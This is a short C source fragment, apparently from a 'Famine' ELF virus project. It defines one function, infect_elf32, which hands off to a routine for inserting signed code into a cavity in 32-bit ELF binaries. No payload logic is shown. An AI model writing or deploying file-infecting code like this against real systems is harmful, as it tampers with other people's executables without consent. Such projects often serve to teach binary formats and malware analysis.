#include "famine.h"

int infect_elf32(t_file *file, t_elf32 *elf32)
{
	return (sign_elf32_cavity(file, elf32));
}
